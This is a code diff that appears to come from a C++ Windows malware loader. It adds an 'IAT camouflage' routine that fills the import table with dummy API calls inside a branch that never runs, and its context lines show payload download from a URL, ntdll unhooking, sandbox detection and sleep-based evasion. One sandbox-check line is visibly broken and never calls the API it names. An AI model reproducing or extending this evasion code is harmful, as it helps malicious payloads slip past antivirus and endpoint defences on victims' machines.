@@ -72,6 +72,42 @@ BOOL GetPayloadFromUrl(LPCWSTR szUrl, std::vector<BYTE>& payload) {
     return TRUE;
 }
 
+PVOID Helper(PVOID *ppAddress) {
+
+    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS | HEAP_ZERO_MEMORY, 0x100);
+    if (!pAddress)
+        return NULL;
+    
+    srand((unsigned)time(NULL));
+    *(int*)pAddress = rand() % 0xFF;
+    
+    *ppAddress = pAddress;
+    return pAddress;
+}
+
+VOID ModifiedIatCamouflage() {
+
+    PVOID   pAddress    = NULL;
+    int*    A           = (int*)Helper(&pAddress);
+    unsigned __int64 i = 0; 
+    
+    if (*A > 400) {
+
+        i = GetTickCount();
+        i = GetCurrentThreadId();
+        SleepEx(0, FALSE);  
+        OutputDebugStringA("Unreachable code");
+        i = GetTickCount();
+        i = CreateDirectoryA(NULL, NULL);
+        i = DeleteFileA(NULL);
+        i = SetEndOfFile(NULL);
+    }
+
+    HeapFree(GetProcessHeap(), 0, pAddress);
+}
+
+
+
 BOOL CheckVirtualAllocExNuma(){
     LPVOID mem = (LPVOID)(GetCurrentProcess(), NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0);
     if (mem == NULL) {
@@ -112,8 +148,7 @@ void unhookNtll(){
 	FreeLibrary(ntdllModule);
 }
 
-void evade() {
-    
+void evade() {    
     std::chrono::steady_clock::time_point startTime = std::chrono::steady_clock::now();
     std::this_thread::sleep_for(std::chrono::milliseconds(2000));
     std::chrono::steady_clock::time_point endTime = std::chrono::steady_clock::now();
